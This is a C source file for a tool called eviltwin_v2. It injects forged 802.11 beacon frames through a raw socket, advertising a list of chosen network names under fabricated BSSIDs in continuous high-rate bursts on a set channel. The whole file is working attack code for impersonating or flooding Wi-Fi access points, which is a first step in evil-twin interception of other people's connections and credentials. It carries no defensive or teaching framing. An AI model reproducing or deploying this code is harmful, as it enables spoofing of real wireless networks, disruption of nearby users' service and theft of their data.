#include "eviltwin_v2.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <linux/if_packet.h>
#include <linux/wireless.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <time.h>

#define V2_RADIOTAP_LEN 12
#define V2_BURST_SIZE 64
#define V2_FRAME_MAX 256
#define V2_MAX_SSIDS 256

typedef struct {
    char ssid[33];
    uint8_t bssid[6];
} v2_entry_t;

static volatile int g_v2_running = 0;
static pthread_t g_v2_thread;
static long long g_v2_sent = 0;
static int g_v2_fd = -1;
static char* g_v2_iface = NULL;
static v2_entry_t* g_v2_entries = NULL;
static int g_v2_count = 0;
static uint8_t g_v2_channel = 1;
static uint16_t g_v2_seq = 0;

static int _raw_socket(const char* iface) {
    struct sockaddr_ll sll;
    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (fd < 0) return -1;
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0) { close(fd); return -1; }
    memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = ifr.ifr_ifindex;
    sll.sll_protocol = htons(ETH_P_ALL);
    if (bind(fd, (struct sockaddr*)&sll, sizeof(sll)) < 0) { close(fd); return -1; }
    return fd;
}

static void _set_channel(const char* iface, int ch) {
    struct iwreq wr;
    memset(&wr, 0, sizeof(wr));
    strncpy(wr.ifr_name, iface, IFNAMSIZ - 1);
    int freq = (ch <= 13) ? (2407 + ch * 5) : (5000 + ch * 5);
    wr.u.freq.m = freq;
    wr.u.freq.e = 6;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return;
    ioctl(fd, SIOCSIWFREQ, &wr);
    close(fd);
}

static uint32_t _hash_ssid(const char* ssid) {
    uint32_t h = 5381;
    int c;
    while ((c = (unsigned char)*ssid++)) h = ((h << 5) + h) + (uint32_t)c;
    return h;
}

static void _ssid_to_bssid(const char* ssid, uint8_t* bssid) {
    uint32_t h = _hash_ssid(ssid);
    bssid[0] = 0x02;
    bssid[1] = (uint8_t)(h & 0xFF);
    bssid[2] = (uint8_t)((h >> 8) & 0xFF);
    bssid[3] = (uint8_t)((h >> 16) & 0xFF);
    bssid[4] = (uint8_t)((h >> 24) & 0xFF);
    bssid[5] = (uint8_t)((h >> 16) ^ (h >> 24));
}

static int _build_beacon(uint8_t* buf, const char* ssid, const uint8_t* bssid, uint8_t channel) {
    int ssid_len = (int)strlen(ssid);
    if (ssid_len > 32) ssid_len = 32;
    memset(buf, 0, V2_FRAME_MAX);
    buf[2] = (uint8_t)(V2_RADIOTAP_LEN & 0xFF);
    buf[3] = (uint8_t)((V2_RADIOTAP_LEN >> 8) & 0xFF);
    int off = V2_RADIOTAP_LEN;
    buf[off] = 0x80; buf[off + 1] = 0x00;
    buf[off + 2] = 0x00; buf[off + 3] = 0x00;
    memset(&buf[off + 4], 0xFF, 6);
    memcpy(&buf[off + 10], bssid, 6);
    memcpy(&buf[off + 16], bssid, 6);
    buf[off + 22] = (uint8_t)((g_v2_seq & 0x0F) << 4);
    buf[off + 23] = (uint8_t)((g_v2_seq >> 4) & 0xFF);
    g_v2_seq = (g_v2_seq + 1) & 0xFFF;
    off += 24;
    uint64_t ts = (uint64_t)(time(NULL) * 1000000ULL);
    memcpy(&buf[off], &ts, 8); off += 8;
    buf[off] = 0x64; buf[off + 1] = 0x00;
    off += 2;
    buf[off] = 0x11; buf[off + 1] = 0x04;
    off += 2;
    buf[off] = 0x00; buf[off + 1] = (uint8_t)ssid_len;
    memcpy(&buf[off + 2], ssid, (size_t)ssid_len);
    off += 2 + ssid_len;
    buf[off] = 0x01; buf[off + 1] = 8;
    memset(&buf[off + 2], 0x82, 8);
    off += 10;
    buf[off] = 0x03; buf[off + 1] = 1;
    buf[off + 2] = channel;
    off += 3;
    return off;
}

static void* _v2_thread(void* arg) {
    (void)arg;
    int fd = _raw_socket(g_v2_iface);
    if (fd < 0) return NULL;
    g_v2_fd = fd;
    _set_channel(g_v2_iface, g_v2_channel);
    int frames_per_burst = V2_BURST_SIZE / g_v2_count;
    if (frames_per_burst < 1) frames_per_burst = 1;
    uint8_t frames[V2_BURST_SIZE][V2_FRAME_MAX];
    int frame_lens[V2_BURST_SIZE];
    struct mmsghdr msgs[V2_BURST_SIZE];
    struct iovec iov[V2_BURST_SIZE];
    int entry_idx = 0;
    while (g_v2_running) {
        int count = 0;
        for (int i = 0; i < frames_per_burst && g_v2_running; i++) {
            int idx = entry_idx % g_v2_count;
            entry_idx++;
            frame_lens[count] = _build_beacon(frames[count], g_v2_entries[idx].ssid,
                                              g_v2_entries[idx].bssid, g_v2_channel);
            iov[count].iov_base = frames[count];
            iov[count].iov_len = (size_t)frame_lens[count];
            msgs[count].msg_hdr = (struct msghdr){.msg_iov = &iov[count], .msg_iovlen = 1};
            count++;
        }
        int sent = sendmmsg(fd, msgs, (unsigned)count, 0);
        if (sent > 0)
            __sync_fetch_and_add(&g_v2_sent, sent);
    }
    close(fd);
    g_v2_fd = -1;
    return NULL;
}

int eviltwin_v2_start(const char* iface, const char* ssids[], int count, uint8_t channel) {
    if (g_v2_running) eviltwin_v2_stop();
    if (count <= 0 || count > V2_MAX_SSIDS) return -1;
    g_v2_entries = calloc((size_t)count, sizeof(v2_entry_t));
    if (!g_v2_entries) return -1;
    g_v2_count = count;
    for (int i = 0; i < count; i++) {
        strncpy(g_v2_entries[i].ssid, ssids[i], 32);
        g_v2_entries[i].ssid[32] = '\0';
        _ssid_to_bssid(g_v2_entries[i].ssid, g_v2_entries[i].bssid);
    }
    g_v2_iface = strdup(iface);
    g_v2_channel = channel;
    g_v2_sent = 0;
    g_v2_running = 1;
    if (pthread_create(&g_v2_thread, NULL, _v2_thread, NULL) != 0) {
        g_v2_running = 0;
        free(g_v2_iface); g_v2_iface = NULL;
        free(g_v2_entries); g_v2_entries = NULL;
        g_v2_count = 0;
        return -1;
    }
    return 0;
}

void eviltwin_v2_stop(void) {
    if (g_v2_running) {
        g_v2_running = 0;
        pthread_join(g_v2_thread, NULL);
    }
    free(g_v2_iface); g_v2_iface = NULL;
    free(g_v2_entries); g_v2_entries = NULL;
    g_v2_count = 0;
}

long long eviltwin_v2_sent(void) {
    return g_v2_sent;
}
